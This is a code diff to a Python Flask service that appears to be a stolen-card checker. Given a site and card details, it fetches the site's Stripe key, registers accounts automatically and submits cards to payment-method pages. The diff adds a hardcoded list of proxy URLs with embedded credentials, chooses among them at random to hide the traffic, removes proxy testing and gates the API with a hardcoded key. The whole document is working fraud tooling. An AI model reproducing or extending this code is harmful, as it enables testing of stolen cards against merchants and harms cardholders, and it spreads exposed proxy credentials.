@@ -16,6 +16,20 @@ logger = logging.getLogger(__name__)
 
 requests.packages.urllib3.disable_warnings()
 
+# Hardcoded Proxy List
+PROXY_LIST = [
+    "http://QHx7z4LAe710hGHQ:pTIqtSnBECb9HmpZ@geo.g-w.info:10080",
+    "http://7rSMKmVZmrEs6rSv:2aEPRTkVEOATS0sB@geo.g-w.info:10080",
+    "http://BGI9SeYej1sJ5fHu:NDp0rWiUotYY25ud@geo.g-w.info:10080",
+    "http://aBX7AipylAgSKum4:CwVD19RjOwibs3Xw@geo.g-w.info:10080",
+    "http://KXLizV3GaYrE79HP:pgUULzTvnJHGdLFI@geo.g-w.info:10080",
+    "http://JCxjRlxVC5a9dgET:igainAzJ8NGOs21N@geo.g-w.info:10080",
+    "http://vpWA1ixCySTygsWq:z2xbGgC1sXJmdw34@geo.g-w.info:10080",
+    "http://1r0JpDP1l0DtgrKa:01M4OkwRjQSMCqJV@geo.g-w.info:10080",
+    "http://kBhzCKGXScZKFDTi:D7rfZwIEqyo9qjNa@geo.g-w.info:10080",
+    "http://BqGTQUNdjGSrQiEP:3MPbEqFynI0Zk3sp@geo.g-w.info:10080"
+]
+
 def get_stripe_key(domain, proxy=None):
     logger.debug(f"Getting Stripe key for domain: {domain}")
     urls_to_try = [
@@ -143,17 +157,6 @@ def register_account(domain, session, proxy=None):
         logger.error(f"Registration error: {e}")
         return False, f"Registration error: {str(e)}"
 
-def test_proxy(proxy):
-    try:
-        test_url = "http://httpbin.org/ip"
-        proxies = {'http': proxy, 'https': proxy}
-        response = requests.get(test_url, proxies=proxies, timeout=5)
-        if response.status_code == 200:
-            return "live"
-    except:
-        pass
-    return "dead"
-
 def process_card_enhanced(domain, ccx, proxy=None, use_registration=True):
     logger.debug(f"Processing card for domain: {domain}")
     ccx = ccx.strip()
@@ -176,19 +179,18 @@ def process_card_enhanced(domain, ccx, proxy=None, use_registration=True):
     session = requests.Session()
     session.headers.update({'User-Agent': user_agent})
     
+    # Directly set proxy config without testing it first (faster)
     proxies_config = None
     proxy_status = "not provided"
+    
     if proxy:
-        proxy_status = test_proxy(proxy)
-        if proxy_status == "live":
-            proxies_config = {'http': proxy, 'https': proxy}
-        else:
-            logger.warning(f"Proxy is {proxy_status}, continuing without proxy")
+        proxies_config = {'http': proxy, 'https': proxy}
+        proxy_status = "active"
 
-    stripe_key = get_stripe_key(domain, proxy if proxy_status == "live" else None)
+    stripe_key = get_stripe_key(domain, proxy)
 
     if use_registration:
-        registered, reg_message = register_account(domain, session, proxy if proxy_status == "live" else None)
+        registered, reg_message = register_account(domain, session, proxy)
         
     payment_urls = [
         f"https://{domain}/my-account/add-payment-method/",
@@ -390,7 +392,7 @@ def api_endpoint():
     try:
         site = request.args.get('site')
         cc = request.args.get('cc')
-        proxy = request.args.get('proxy')
+        # proxy argument is ignored now, using hardcoded list instead
         key = request.args.get('key')
         
         if not site or not cc:
@@ -398,7 +400,7 @@ def api_endpoint():
                 "status": "ERROR",
                 "response": "Missing required parameters: site and cc",
                 "cc": cc if cc else "N/A",
-                "proxy": "not provided"
+                "proxy": "hardcoded"
             }), 400
         
         if key and key != "inferno":
@@ -406,7 +408,7 @@ def api_endpoint():
                 "status": "ERROR",
                 "response": "Invalid API key",
                 "cc": cc,
-                "proxy": "not provided"
+                "proxy": "hardcoded"
             }), 401
         
         domain = site
@@ -422,7 +424,7 @@ def api_endpoint():
                 "status": "ERROR",
                 "response": "Invalid domain format",
                 "cc": cc,
-                "proxy": "not provided"
+                "proxy": "hardcoded"
             }), 400
             
         if not re.match(r'^\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}$', cc):
@@ -430,16 +432,19 @@ def api_endpoint():
                 "status": "ERROR",
                 "response": "Invalid card format. Use: NUMBER|MM|YY|CVV",
                 "cc": cc,
-                "proxy": "not provided"
+                "proxy": "hardcoded"
             }), 400
         
-        result = process_card_enhanced(domain, cc, proxy)
+        # Select a random proxy from the hardcoded list
+        selected_proxy = random.choice(PROXY_LIST)
+        
+        result = process_card_enhanced(domain, cc, selected_proxy)
         
         return jsonify({
             "status": result.get("status", "ERROR"),
             "response": result.get("response", "Unknown error"),
             "cc": result.get("cc", cc),
-            "proxy": result.get("proxy", "not provided")
+            "proxy": result.get("proxy", "hardcoded")
         })
         
     except Exception as e:
@@ -448,7 +453,7 @@ def api_endpoint():
             "status": "ERROR",
             "response": f"Internal server error: {str(e)}",
             "cc": cc if 'cc' in locals() else "N/A",
-            "proxy": proxy if proxy else "not provided"
+            "proxy": "hardcoded"
         }), 500
 
 @app.route('/health')
@@ -461,7 +466,7 @@ def not_found(error):
         "status": "ERROR",
         "response": "Endpoint not found",
         "cc": "N/A",
-        "proxy": "not provided"
+        "proxy": "hardcoded"
     }), 404
 
 @app.errorhandler(500)
@@ -470,7 +475,7 @@ def internal_error(error):
         "status": "ERROR",
         "response": "Internal server error",
         "cc": "N/A",
-        "proxy": "not provided"
+        "proxy": "hardcoded"
     }), 500
 
 if __name__ == '__main__':
